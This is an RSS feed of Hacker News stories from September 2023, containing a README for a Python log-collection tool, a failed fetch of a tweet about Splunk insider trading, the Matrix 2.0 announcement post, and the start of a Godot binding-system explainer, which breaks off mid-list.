<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 21 Sep 2023 19:00:06 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Show HN: My Single-File Python Script I Used to Replace Splunk in My Startup (200 pts)]]></title>
            <link>https://github.com/Dicklesworthstone/automatic_log_collector_and_analyzer</link>
            <guid>37600019</guid>
            <pubDate>Thu, 21 Sep 2023 16:26:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Dicklesworthstone/automatic_log_collector_and_analyzer">https://github.com/Dicklesworthstone/automatic_log_collector_and_analyzer</a>, See on <a href="https://news.ycombinator.com/item?id=37600019">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" id="user-content-automatically-download-and-analyze-log-files-from-remote-machines" dir="auto"><a href="#automatically-download-and-analyze-log-files-from-remote-machines">Automatically Download and Analyze Log Files from Remote Machines</a></h2>
<p dir="auto">This application is designed to collect and analyze logs from remote machines hosted on Amazon Web Services (AWS) and other cloud hosting services.</p>
<p dir="auto"><strong>Note</strong>: This application was specifically designed for use with Pastel Network's log files. However, it can be easily adapted to work with any log files by modifying the parsing functions, data models, and specifying the location and names of the log files to be downloaded. It is compatible with log files stored in a standard format, where each entry is on a separate line and contains a timestamp, a log level, and a message. The application has been tested with log files several gigabytes in size from dozens of machines and can process all of it in minutes. It is designed for Ubuntu 22.04+, but can be adapted for other Linux distributions.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/Dicklesworthstone/automatic_log_collector_and_analyzer/main/demo_screenshot.png"><img src="https://raw.githubusercontent.com/Dicklesworthstone/automatic_log_collector_and_analyzer/main/demo_screenshot.png" alt="Demo Screenshot:"></a></p>
<h2 tabindex="-1" id="user-content-customization" dir="auto"><a href="#customization">Customization</a></h2>
<p dir="auto">To adapt this application for your own use case, refer to the included sample log files and compare them to the parsing functions in the code. You can also modify the data models to store log entries as desired.</p>
<h2 tabindex="-1" id="user-content-features" dir="auto"><a href="#features">Features</a></h2>
<p dir="auto">The application consists of various Python scripts that perform the following functions:</p>
<ul dir="auto">
<li><strong>Connect to Remote Machines</strong>: Using the boto3 library for AWS instances and an Ansible inventory file for non-AWS instances, the application establishes SSH connections to each remote machine.</li>
<li><strong>Download and Parse Log Files</strong>: Downloads specified log files from each remote machine and parses them. The parsed log entries are then queued for database insertion.</li>
<li><strong>Insert Log Entries into Database</strong>: Uses SQLAlchemy to insert the parsed log entries from the queue into an SQLite database.</li>
<li><strong>Process and Analyze Log Entries</strong>: Processes and analyzes log entries stored in the database, offering functions to find error entries and create views of aggregated data based on specified criteria.</li>
<li><strong>Generate Network Activity Data</strong>: Fetches and processes network activity data from each remote machine.</li>
<li><strong>Expose Database via Web App using Datasette</strong>: Once the database is generated, it can be shared over the web using Datasette.</li>
</ul>
<h2 tabindex="-1" id="user-content-compatibility" dir="auto"><a href="#compatibility">Compatibility</a></h2>
<p dir="auto">The tool is compatible with both AWS-hosted instances and any list of Linux instances stored in a standard Ansible inventory file with the following structure:</p>
<div dir="auto" data-snippet-clipboard-copy-content="all:
  vars:
    ansible_connection: ssh
    ansible_user: ubuntu
    ansible_ssh_private_key_file: /path/to/ssh/key/file.pem
  hosts:
    MyCoolMachine01:
      ansible_host: 1.2.3.41
    MyCoolMachine02:
      ansible_host: 1.2.3.41.19"><pre><span>all</span>:
  <span>vars</span>:
    <span>ansible_connection</span>: <span>ssh</span>
    <span>ansible_user</span>: <span>ubuntu</span>
    <span>ansible_ssh_private_key_file</span>: <span>/path/to/ssh/key/file.pem</span>
  <span>hosts</span>:
    <span>MyCoolMachine01</span>:
      <span>ansible_host</span>: <span>1.2.3.41</span>
    <span>MyCoolMachine02</span>:
      <span>ansible_host</span>: <span>1.2.3.41.19</span></pre></div>
<p dir="auto">(Both can be used seamlessly.)</p>
<h2 tabindex="-1" id="user-content-warning" dir="auto"><a href="#warning">Warning</a></h2>
<p dir="auto">To simplify the code, the tool is designed to delete all downloaded log files and generated databases each time it runs. Consequently, this can consume significant bandwidth depending on your log files' size. However, the design's high level of parallel processing and concurrency allows it to run quickly, even when connecting to dozens of remote machines and downloading hundreds of log files.</p>
<h2 tabindex="-1" id="user-content-usage" dir="auto"><a href="#usage">Usage</a></h2>
<p dir="auto">Designed for Ubuntu 22.04+, first install the requirements:</p>
<div dir="auto" data-snippet-clipboard-copy-content="python3 -m venv venv
source venv/bin/activate
python3 -m pip install --upgrade pip
python3 -m pip install wheel
pip install -r requirements.txt"><pre>python3 -m venv venv
<span>source</span> venv/bin/activate
python3 -m pip install --upgrade pip
python3 -m pip install wheel
pip install -r requirements.txt</pre></div>
<p dir="auto">You will also need to install Redis:</p>
<div dir="auto" data-snippet-clipboard-copy-content="sudo apt install redis -y"><pre>sudo apt install redis -y</pre></div>
<p dir="auto">And install Datasette to expose the results as a website:</p>
<div dir="auto" data-snippet-clipboard-copy-content="sudo apt install pipx -y &amp;&amp; pipx ensurepath &amp;&amp; pipx install datasette"><pre>sudo apt install pipx -y <span>&amp;&amp;</span> pipx ensurepath <span>&amp;&amp;</span> pipx install datasette</pre></div>
<p dir="auto">To run the application every 30 minutes as a cron job, execute:</p>

<p dir="auto">And add the following line:</p>
<div dir="auto" data-snippet-clipboard-copy-content="*/15 * * * * . $HOME/.profile; /home/ubuntu/automatic_log_collector_and_analyzer/venv/bin/python /home/ubuntu/automatic_log_collector_and_analyzer/automatic_log_collector_and_analyzer.py >> /home/ubuntu/automatic_log_collector_and_analyzer/log_$(date +\%Y-\%m-\%dT\%H_\%M_\%S).log 2>&amp;1"><pre><span>*</span>/15 <span>*</span> <span>*</span> <span>*</span> <span>*</span> <span>.</span> <span>$HOME</span>/.profile<span>;</span> /home/ubuntu/automatic_log_collector_and_analyzer/venv/bin/python /home/ubuntu/automatic_log_collector_and_analyzer/automatic_log_collector_and_analyzer.py <span>&gt;&gt;</span> /home/ubuntu/automatic_log_collector_and_analyzer/log_<span><span>$(</span>date +<span>\%</span>Y-<span>\%</span>m-<span>\%</span>dT<span>\%</span>H_<span>\%</span>M_<span>\%</span>S<span>)</span></span>.log <span>2&gt;&amp;1</span></pre></div>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Insider trade on Splunk acquisition for 45,650% return (281 pts)]]></title>
            <link>https://twitter.com/unusual_whales/status/1704870849831125446</link>
            <guid>37599587</guid>
            <pubDate>Thu, 21 Sep 2023 15:58:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/unusual_whales/status/1704870849831125446">https://twitter.com/unusual_whales/status/1704870849831125446</a>, See on <a href="https://news.ycombinator.com/item?id=37599587">Hacker News</a></p>
Couldn't get https://twitter.com/unusual_whales/status/1704870849831125446: Error [ERR_FR_TOO_MANY_REDIRECTS]: Maximum number of redirects exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Matrix 2.0: The Future of Matrix (172 pts)]]></title>
            <link>https://matrix.org/blog/2023/09/matrix-2-0/</link>
            <guid>37599510</guid>
            <pubDate>Thu, 21 Sep 2023 15:53:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://matrix.org/blog/2023/09/matrix-2-0/">https://matrix.org/blog/2023/09/matrix-2-0/</a>, See on <a href="https://news.ycombinator.com/item?id=37599510">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p><strong><em>TL;DR: If you want to play with a shiny new Matrix 2.0 client, head over to <a href="https://element.io/blog/element-x-ignition/">Element X</a>.</em></strong></p>
<p>Matrix has been going for over 9 years now, providing an open standard for secure, decentralised communication for the open Web - and it’s been quite the journey to get to where we are today.  Right now, according to Synapse’s opt-in usage reporting, in total there are 111,873,374 matrix IDs on the public network, spanning 17,289,201 rooms, spread over 64,256 servers.  This is just scratching the surface, given we estimate that 66% of servers in the public network don’t report stats, and there are many enormous private networks of servers too.  We’ve come a long way from creating Matrix HQ as the first ever room on today’s public network, back on Aug 13th 2014 :)</p>
<p>Meanwhile, the Matrix ecosystem has continued to grow unbelievably - with huge numbers of independent clients, bots and bridges maturing into ecosystems of their own, whole new companies forming around the protocol, and organisations ranging from open source projects to governments, NGOs and Fortune 100 companies adopting Matrix as a way to run their own secure, decentralised, standards-based self-sovereign communication.</p>
<p>The world needs Matrix more than ever.  Every day the importance of decentralisation is more painfully obvious, as we concretely see the terrifying risks of centralised Internet services - whether that’s through corporate takeover, state censorship, blanket surveillance, Internet shutdowns, surveillance capitalism, or the spectre of gigantic centralised data breaches.  It’s been amazing to see the world pivot in favour of decentralisation over the time we’ve been building Matrix, and our mission has never been more important.</p>
<p>On one hand it feels we’re creeping ever closer to that goal of providing the missing communication layer for the open Web.  The European Union’s Digital Markets Act (DMA) is a huge step in that direction - regulation that mandates that if the large centralised messaging providers are to operate in the EU, they <strong>must</strong> interoperate.  We’ve been busy working away to make this a reality, including participating in the IETF for the first time as part of the MIMI working group - demonstrating <a href="https://datatracker.ietf.org/meeting/117/materials/slides-117-mimi-linearized-matrix-for-mimi-01">concretely</a> how (for instance) Android Messages could natively speak Matrix in order to interoperate with other services, while preserving end-to-end encryption.</p>
<p>On the other hand, Matrix has often got stuck in focusing on solving the Hard Problems of decentralisation, decentralised end-to-end encryption, and the logistical complexities of supporting a massive heterogeneous public communication network and its surrounding heterogeneous ecosystem.  It’s fair to say that in the early days our focus was on making something that worked at all - and then later, we shifted to focusing on something that worked and scaled correctly… but we hadn’t managed to focus on ensuring that Matrix provides the building blocks necessary to create blazingly fast, hyper-efficient communication apps which has potential to outperform the centralised mainstream messaging services…</p>
<p><strong>…until now!</strong></p>
<h2 id="matrix-2-0">Matrix 2.0</h2>
<p>Back at FOSDEM <a href="https://archive.fosdem.org/2023/schedule/event/matrix20/">we announced the idea of Matrix 2.0</a> - a series of huge step changes in terms of Matrix’s usability and performance, made up of <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3575">Sliding Sync</a> (instant login/launch/sync), <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3861">Native OIDC</a> (industry-standard authentication), <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3401">Native Group VoIP</a> (end-to-end encrypted large-scale voice &amp; video conferencing) and <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3902">Faster Joins</a> (lazy-loading room state when your server joins a room).</p>
<p>Now, we’re excited to announce that as of today everyone can start playing with these Matrix 2.0 features. There’s still some work to bring them formally into the specification, but we’re putting it out there for folks to experience right now. Developers: watch this space for updates on the spec front.</p>
<p>Practically speaking, this means there are now implementations of the four pillars of Matrix 2.0 available today which you can use to power a daily-driver Matrix 2.0 client.  The work here has been driven primarily by <a href="https://element.io/">Element</a>, using their new <a href="https://element.io/labs/element-x">Element X</a> client as the test-bed for the new Matrix 2.0 functionality and to prove that the new APIs are informed by real-world usage and can concretely demonstrably create an app which begins to outperform iMessage, WhatsApp and Telegram in terms of usability and performance… all while benefiting from being 100% built on Matrix.</p>
<h3 id="matrix-rust-sdk-and-element-x">matrix-rust-sdk and Element X</h3>
<p><a href="https://element.io/blog/element-x-ignition/"><img src="https://matrix.org/blog/img/20230921-element-x.png"></a></p>
<p>The mission of Matrix 2.0 has been to provide a huge step forwards in real-world performance, usability and stability - and that means using a real client codebase as a guinea pig to ensure the new protocol is fit for purpose. <a href="https://github.com/matrix-org/matrix-rust-sdk">matrix-rust-sdk</a> has been the main vehicle for this, with <a href="https://element.io/labs/element-x">Element X</a> as the app primarily driving the new features (although other clients built on matrix-rust-sdk such as <a href="https://gitlab.gnome.org/GNOME/fractal#beta-version">Fractal 5</a> can then automatically benefit from the work should they wish).</p>
<p>To see what all the fuss is about, your best bet is probably to head over to the <a href="https://element.io/blog/element-x-ignition/">Element X launch blog post</a> and read all about it!  But from the Matrix perspective, this is a flag day in terms of the existence of a Matrix client which empirically outperforms the mainstream clients both in terms of usability and performance: it shows that Matrix is indeed viable to power communication for billions of users, should we get the chance.</p>
<p>From a client perspective: this has meant implementing Sliding Sync (<a href="https://github.com/matrix-org/matrix-spec-proposals/blob/kegan/sync-v3/proposals/3575-sync.md">MSC3575</a>) in matrix-rust-sdk - and then creating the entirely new <a href="https://matrix-org.github.io/matrix-rust-sdk/matrix_sdk_ui/index.html">matrix-sdk-ui</a> crate in order to expose higher level APIs to help apps efficiently drive their UI, without each app having to keep reinventing the wheel and risking getting it wrong.  The new UI crate gives APIs for efficiently managing a lazy-loaded room list, lazy-loaded room timelines (including edits, reactions, aggregations, redactions etc), and even when the app should show a sync spinner or not.  As a result, the vast majority of the heavy lifting can be handled in matrix-rust-sdk, ensuring that the app layer can focus on UI rather than Matrix guts - and performance improvements (e.g. roomlist caching and timeline caching) can all be handled in one place to the benefit of all clients using the SDK.</p>
<p>This is a huge breakthrough relative to the old days of Matrix where each client would have no choice but burn significant amounts of time hand-carving its own timeline and encryption glue logic (although of course clients are still very welcome to do so if they wish!) - but for those wanting higher-level building building blocks, matrix-rust-sdk now provides an excellent basis for experimenting with Matrix 2.0 clients.  It’s worth noting that the library is still evolving <strong>fast</strong>, though, and many APIs are not long-term stable.  Both the Sliding Sync API and the UI crates are still subject to significant change, and while the crypto crate and its underlying <a href="https://github.com/matrix-org/vodozemac">vodozemac</a> E2EE implementation is pretty stable, features such as E2EE Backup are still being added to the top-level matrix-rust-sdk (and thence Element X).</p>
<p>In order to hook matrix-rust-sdk up to Element X, the Element team <a href="https://github.com/mozilla/uniffi-rs/pull/1346">ended</a> <a href="https://github.com/mozilla/uniffi-rs/pull/1292">up</a> <a href="https://github.com/mozilla/uniffi-rs/pull/1259">contributing</a> <a href="https://github.com/mozilla/uniffi-rs/pull/1684">cancellable</a> <a href="https://github.com/mozilla/uniffi-rs/pull/1409">async bindings</a> to <a href="https://mozilla.github.io/uniffi-rs/">uniffi</a>, Mozilla’s language binding generator, so you can now call matrix-rust-sdk directly from Swift, Kotlin and (in theory) other languages, complete with beautifully simple async/await non-blocking semantics.  This looks to be a pretty awesome stack for doing modern cross-platform development - so even if you have a project which isn’t natively in Rust, you should be able to lean on matrix-rust-sdk if you so desire!  We hope that other projects will follow the Rust + Swift/Kotlin pattern for their extreme performance needs :)</p>
<h3 id="sliding-sync">Sliding Sync</h3>
<p>The single biggest change in Matrix 2.0 is the proposal of an entirely new sync API called Sliding Sync (<a href="https://github.com/matrix-org/matrix-spec-proposals/blob/kegan/sync-v3/proposals/3575-sync.md">MSC3575</a>).  The goal of Sliding Sync is to ensure that the application has the option of loading the absolutely bare essential data required to render its visible user interface - ensuring that operations which have historically been horribly slow in Matrix (login and initial sync, launch and incremental sync) are instant, no matter how many rooms the user is in or how large those rooms are.</p>
<p>While matrix-rust-sdk implements both Sync v2 (the current API in Matrix 1.8) as well as Sliding Sync, Element X deliberately only implements Sliding Sync, in order to focus exclusively on getting the fastest UI possible (and generally to exercise the API).  Therefore to use Element X, you need to be running a homeserver with Sliding Sync support, which (for now) means running a <a href="https://github.com/matrix-org/sliding-sync">sliding-sync proxy</a> which bolts Sliding Sync support on to existing homeservers.  You can check out Thib’s <a href="https://www.youtube.com/watch?v=25wkV2ZCSsM">excellent tutorial</a> for how to get up and running (or <a href="https://element.io/server-registration">Element Server Suite</a> provides packages from the Element team)</p>
<p>Now, implementing Sliding Sync in matrix-rust-sdk has been a bit of a journey.  Since we <a href="https://archive.fosdem.org/2023/schedule/event/matrix_clients_as_good_as_youd_expect/">showed off</a> the very first implementation at FOSDEM, two big problems came to light.  For a bit of context: the original design of Sliding Sync was heavily inspired by Discord’s architecture - where the server calculates an ordered list of large numbers of items (your room list, in Matrix’s case); the client says which window into the list it’s currently displaying; and the server sends updates to the client as the view changes.  The user then scrolls around that list, sliding the window up and down, and the server sends the appropriate updates - hence the name Sliding Sync.</p>
<p>Sliding Sync was originally driven by our work on <a href="https://github.com/matrix-org/lb">Low Bandwidth Matrix</a> - as it makes no sense to have a fancy line protocol which can run over a 2400 baud modem… if the first thing the app tries to do is download a 100MB Sync v2 initial-sync response, or for that matter a 10MB incremental-sync response after having been offline for a few days (10MB takes 9 hours to shift over a 2400 baud modem, for those who missed out on the 80s).  Instead, you clearly only want to send the absolute essentials to the client, no matter how big their account is, and that’s what Sliding Sync does.</p>
<p>The first minor flaw in the plan, however, is that the server doesn’t necessarily have all the data it needs to order the room list.  Room ordering depends on what the most recent visible events are in a room, and if the room’s end-to-end encrypted, the server has no way of knowing which events are going to be visible for a given client or not.  It also doesn’t know which rooms have encrypted mentions inside them, and we <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3952#discussion_r1112203279">don’t want to leak mention metadata</a> to the server, or design out keyword mentions.  So, MSC3575 proposed some complicated contortions to let the client tweak the order client-side based on its superior knowledge of the ordering (given most clients would need to sync all the encrypted rooms anyway, in order to index them and search for keyword notifications etc).  Meanwhile, the order might be ‘good enough’ even without those tweaks.</p>
<p>The second minor flaw in the plan was that having implemented Sliding Sync in Element X, it turns out that the user experience on mobile of incrementally loading in room list entries from the server as the user scrolls around the list is simply not good enough, especially on bad connectivity - and the last thing we want to do is to design out support for bad connectivity in Matrix.  Users have been trained on mobile to expect to be able to swipe rapidly through infinite-scrolling lists of tens of thousands of photos in their photo gallery, or tens of thousands of emails in their mail client, without ever seeing a single placeholder, even for a frame.  So if the network roundtrip time to your server is even 100ms, and Sliding Sync is operating infinitely quickly, you’re still going to end up showing a placeholders for a few frames (6 frames, at 60fps, to be precise) if the user starts scrolling rapidly through their room list.  And empirically that doesn’t look great - the 2007-vintage <a href="https://www.amazon.co.uk/Creative-Selection-Ken-Kocienda/dp/1250194466">iOS team</a> have a lot to answer for in terms of setting user expectations!</p>
<p>So, the obvious way to solve both of these problems is simply to pull in more data in the background, to anticipate the user scrolling around.  In fact, it turns out we need to do that anyway, and indeed pull in <em>all</em> the room data so that room-search is instantly responsive; waiting 100ms or more to talk to the server whenever the user tries to search their roomlist is no fun at all, and it transpires that many users navigate their roomlist entirely by search rather than scrolling.  As a result, the sliding sync implementation in matrix-rust-sdk has ended up maintaining an ‘all rooms’ list, which starts off syncing the roomlist details for the most recent N rooms, and then in the background expands to sync all the rest.  At which point we’re not really sliding a window around any more: instead it’s more of a QoSed incremental sync.</p>
<p>So, to cut a long story short: while the current Sliding Sync implementation in matrix-rust-sdk and Element X empirically works very well, it’s ended up being a bit too complicated and we expect some pretty significant simplifications in the near future based on the best practices figured out with clients using it.  Watch this space for updates, although it’s likely that the current form of MSC3575 will prevail in some respect in order to support low-bandwidth environments where roomlist ordering and roomsearch latency is less important than preserving bandwidth.  Critically, we want to figure this out before we encourage folks to implement native server implementations - so for now, we’ll be keeping using the sliding-sync proxy as a way to rapidly experiment with the API as it evolves.</p>
<h3 id="native-matrix-group-voip">Native Matrix Group VoIP</h3>
<p>Another pillar of Matrix 2.0 is that we finally have native Matrix Group VoIP calling (<a href="https://github.com/matrix-org/matrix-spec-proposals/blob/matthew/group-voip/proposals/3401-group-voip.md">MSC3401</a>)!  Much like Sliding Sync has been developed using Element X as a testbed, <a href="https://call.element.io/">Element Call</a> has been the guinea pig for getting fully end-to-end-encrypted, scalable group voice/video calling implemented on top of Matrix, building on top of matrix-js-sdk.  And as of today, Element Call finally has it working, complete with end-to-end encryption (and integrated in Element X, for that matter)!</p>
<p><img src="https://matrix.org/blog/img/20230921-element-call.png" alt=""></p>
<p>Much like Sliding Sync, this has also been a bit of a journey.  The <a href="https://element.io/blog/introducing-native-matrix-voip-with-element-call/">original</a> implementations of Element Call strictly followed MSC3401, using full mesh conferencing to effectively have every participant place a call to every other participant - thus decentralising the conference and avoiding the need for a conferencing ‘focus’ server… but limiting the conference to 7 or 8 participants given all the duplication of the sent video required.  In Element Call <a href="https://element.io/blog/element-call-beta-2-encryption-spatial-audio-walkie-talkie-mode-and-more/">Beta 2</a>, end-to-end encryption was enabled; easy, given it’s just a set of 1:1 calls.</p>
<p>Then the real adventure began: to implement a Selective Forwarding Unit (SFU) which can be used to scale up to hundreds of users - or beyond. The unexpected first move came from Sean DuBois, project lead of the awesome <a href="https://pion.ly/">Pion</a> WebRTC stack for Golang - who wrote a proof-of-concept called sfu-to-sfu to demonstrate the viability of decentralised heterogenous cascading SFUs, as detailed in <a href="https://github.com/matrix-org/matrix-spec-proposals/blob/SimonBrandner/msc/sfu/proposals/3898-sfu.md">MSC3898</a>. This would not only let calls on a single focus scale beyond hundreds of users, but also share the conferencing out across all the participating foci, providing the world’s first heterogeneous decentralised video conferencing.  Element took the sfu-to-sfu implementation, hooked it up to Element Call on a branch, and renamed it as <a href="https://github.com/matrix-org/waterfall">waterfall</a>.</p>
<p>However, when Sean first contributed sfu-to-sfu, he mentioned to us that if Matrix is serious about SFUs, we should take a look at <a href="https://livekit.io/">LiveKit</a> - an open source startup not dissimilar to Element who were busy building best-in-class SFUs on top of Pion. And while waterfall worked well as a proof of concept, it became increasingly obvious that there’s a lot of work to be done around tuning congestion control, error correction, implementing end-to-end encryption etc which the LiveKit team had already spent years doing.  So, Element reached out to the LiveKit team, and started experimenting with what it might take to implement a Matrix-capable SFU on top of the LiveKit engine.</p>
<p>The end result was Element Call <a href="https://element.io/blog/element-call-beta-3/">Beta 3</a>, which is an interesting hybrid between MSC3401 and LiveKit’s existing signalling: the high-level signalling of the call (its existence, membership, duration etc) is advertised by Matrix - but the actual WebRTC signalling is handled by LiveKit, providing support for hundreds of users per call.</p>
<p>Finally, today marks the release of Element Call <a href="https://element.io/blog/element-x-ignition/#native-matrix-video-conferencing-with-element-call">Beta 4</a>, which adds back end-to-end encryption via the LiveKit SFU (currently by using a shared static secret, but in the near future will support full Matrix-negotiated end-to-end encryption with sender keys) - and also includes a complete visual refresh.  The next steps here include bringing back support for full mesh as well as SFU, for environments without an SFU, and updating all the MSCs to recognise the hybrid signalling model that reality has converged on when using LiveKit.  Meanwhile, head over to <a href="https://call.element.io/">https://call.element.io</a> to give it a go, or read more about it in the <a href="https://element.io/blog/element-x-ignition/">Element X Ignition blog post</a>!</p>
<h3 id="native-open-id-connect">Native Open ID Connect</h3>
<p>Finally, last but not least, we’re proud to announce that the project to replace Matrix’s venerable existing authentication APIs with industry-standard Open ID Connect in Matrix 2.0 has taken a huge leap forwards today, with <a href="https://matrix-org.github.io/matrix-authentication-service">matrix-authentication-service</a> now being available to add Native OIDC support to Synapse, as well as Element X now implementing account registration, login and management via Native OIDC (with legacy support only for login/logout).</p>
<p>This is a critical step forwards in improving the security and maintainability for Matrix’s authentication, and you can read all about it in this <a href="https://matrix.org/blog/2023/09/better-auth/">dedicated post</a>, explaining the rationale for adopting OpenID Connect for all forms of authentication throughout Matrix, and what you need to know about the transition.</p>
<h2 id="conclusion">Conclusion</h2>
<p>There has been an <strong>enormous</strong> amount of work that has gone into Matrix 2.0 so far - whether that’s implementing sliding sync in matrix-rust-sdk and sliding-sync proxy, matrix-authentication-service and all the native OIDC infrastructure on servers and clients, the entirety of Element Call and its underpinning matrix-js-sdk and SFU work, or indeed Faster Joins in Synapse, which shipped back in <a href="https://matrix.org/blog/2023/01/31/synapse-1-76-released/">Jan</a>.</p>
<p>It’s been a pretty stressful sprint to pull it all together, and huge thanks go to everyone who’s contributed - both from the team at Element, but also contributors to other projects like matrix-rust-sdk who have got caught in the crossfire :)  It’s also been amazing seeing the level of support, high quality testing and excellent feedback from the wider community as folks have got excited about the promise of Matrix 2.0.</p>
<p>On the Foundation side, we’d like to thank the <a href="https://matrix.org/blog/2023/06/membership-program/">Members</a> whose financial support has been critical in providing bandwidth to enable the progress on Matrix 2.0 - and for those who want to help accelerate Matrix, especially those commercially building on top of Matrix, please consider <a href="https://matrix.org/membership/">joining the Foundation</a> as a member!  Also, in case you missed it, we’re super excited to <a href="https://matrix.org/blog/2023/09/introducing-josh-simmons-managing-director/">welcome Josh Simmons as Managing Director</a> for the Foundation - focusing on running the Foundation membership programme and generally ensuring the growth of the Foundation funding for the benefit of the whole Matrix community. Matthew and Amandine continue to lead the overall project (alongside their day jobs at Element), with the support of the other three independent Guardians - but Josh is working full time exclusively on running the non-profit foundation and gathering funds to support Matrix.</p>
<p>Talking of funding, we should mention that we’ve had to pause work in other places due to lack of Matrix funding - especially while focusing on successfully shipping Matrix 2.0. Major next-generation projects including <a href="https://thirdroom.io/">Third Room</a>, <a href="https://arewep2pyet.com/">P2P Matrix</a>, and <a href="https://matrix.org/blog/2021/06/10/low-bandwidth-matrix-an-implementation-guide/">Low Bandwidth Matrix</a> have all been paused unless there’s a major shift in circumstances - so, if you have money and you’re interested in a world where the more experimental next-generation Matrix projects progress with folks working on them as their day job, please <a href="https://matrix.org/membership/">get in touch</a> with the Foundation.</p>
<h2 id="what-s-next">What’s next?</h2>
<p>While this is the first usable release of Matrix 2.0 implementations, there’s loads of work still to be done - obvious work on Matrix 2.0 includes:</p>
<ul>
<li>Getting Native OIDC enabled on matrix.org, and providing migration tools to Native OIDC for existing homeservers in general</li>
<li>Reworking Sliding Sync based on the lessons learned implementing it in matrix-rust-sdk</li>
<li>Actually getting the Matrix 2.0 MSCs stabilised and matured to the point they can be approved and merged into the spec</li>
<li>Adding encrypted backups to matrix-rust-sdk</li>
<li>Reintroducing full-mesh support for Native Matrix Group VoIP calling</li>
<li>Having a big Matrix 2.0 launch party once the spec lands!</li>
</ul>
<p>Outside of Matrix 2.0 work, other big items on the horizon include:</p>
<ul>
<li>Adding Rust matrix-sdk-crypto to matrix-js-sdk, at which point all the official Matrix.org client SDKs will (at last!) be using the same stable performant E2EE implementation</li>
<li>Continuing to contribute Matrix input to the MIMI working group in IETF for Digital Markets Act interoperability</li>
<li>Working on <a href="https://arewemlsyet.com/">MLS</a> for next-generation E2EE</li>
<li>Next generation moderation tooling and capabilities</li>
<li>Account Portability and Multihomed accounts</li>
<li>…and much much more.</li>
</ul>
<p>So: welcome to our brave new Matrix 2.0 world. We hope you’re excited about it as we are - and thanks to everyone for continuing to use Matrix and build on it.  Here’s to the beginning of a whole new era!</p>
<p>Matthew, Amandine and the whole Matrix team.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Article reply “Godot is not the new Unity” from Juan Linietsky (BDFL of Godot) (199 pts)]]></title>
            <link>https://gist.github.com/reduz/cb05fe96079e46785f08a79ec3b0ef21</link>
            <guid>37598985</guid>
            <pubDate>Thu, 21 Sep 2023 15:21:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gist.github.com/reduz/cb05fe96079e46785f08a79ec3b0ef21">https://gist.github.com/reduz/cb05fe96079e46785f08a79ec3b0ef21</a>, See on <a href="https://news.ycombinator.com/item?id=37598985">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="file-godot_binding_system_explained-md">
    <article itemprop="text"><p dir="auto">During the past days, this <a href="https://sampruden.github.io/posts/godot-is-not-the-new-unity/" rel="nofollow">great article</a> by Sam Pruden has been
making the rounds around the gamedev community. While the article provides an in-depth analysis, its a bit easy to miss the
point and exert the wrong conclusions from it. As such, and in many cases, users unfamiliar with Godot internals have used
it points such as following:</p>
<ul dir="auto">
<li>Godot C# support is inefficient</li>
<li>Godot API and binding system is designed around GDScript</li>
<li>Godot is not production ready</li>
</ul>
<p dir="auto">In this brief article, I will shed a bit more light about how the Godot binding system works and some detail on the Godot
architecture. This should hopefully help understand many of the technical decisions behind it.</p>
<h3 id="user-content-built-in-types" dir="auto"><a href="#built-in-types">Built-in Types</a></h3>
<p dir="auto">Compared to other game engines, Godot is designed with a relatively high level data model in mind. At the heart, it uses several
datatypes across the whole engine. These datatypes are:</p>
<ul dir="auto">
<li><strong>Nil</strong>: To indicate an empty value.</li>
<li><strong>Bool, Int64 and Float64</strong>: For scalar math.</li>
<li><strong>String</strong>: For String and Unicode handling.</li>
<li><strong>Vector2, Vector2i, Rect2, Rect2i, Transform2D</strong>: For 2D Vector math.</li>
<li><strong>Vector3, Vector4, Quaternion, AABB, Plane, Projection, Basis, Transform3D</strong>: For 3D Vector math.</li>
<li><strong>Color</strong>: For color space math.</li>
<li><strong>StringName</strong>: For fast processing of Unique IDs (internally a unique pointer).</li>
<li><strong>NodePath</strong>: For referencing paths between nodes in the Scene Tree.</li>
<li><strong>RID</strong>: Resource ID for referencing a resource inside a server.</li>
<li><strong>Object</strong>: An instance of a class.</li>
<li><strong>Callable</strong>: A generic function pointer.</li>
<li><strong>Signal</strong>: A signal (see Godot docs).</li>
<li><strong>Dictionary</strong>: A generic dictionary (can contain any of these datatypes as either key or value).</li>
<li><strong>Array</strong>: A generic array (can contain any of these datatypes).</li>
<li><strong>PackedByteArray, PackedInt32Array, PackedInt64Array, PackedFloatArray, PackedDoubleArray</strong>: Scalar packed arrays.</li>
<li><strong>PackedVector2Array, PackedVector3Array, PackedColorarray</strong>: Vector packed arrays.</li>
<li><strong>PackedStringArray</strong>: Packed string array.</li>
</ul>
<p dir="auto">Does this mean that anything you do in Godot has to use these datatypes? Absolutely not.
These datatypes have several roles in Godot:</p>
<ul dir="auto">
<li><strong>Storage</strong>: Any of these datatypes can be saved to disk and loaded back very efficiently.</li>
<li><strong>Transfer</strong>: These datatypes can be very efficiently marshalled and compressed for transfer over a network.</li>
<li><strong>Introspection</strong>: Objects in Godot can only expose their properties as any of those datatypes.</li>
<li><strong>Editing</strong>: When editing any object in Godot, it is done via any of these datatypes (of course, different editors can exist for the same datatype, depending on the context).</li>
<li><strong>Languge API</strong>: Godot exposes its API to all languages it binds via those datatypes.</li>
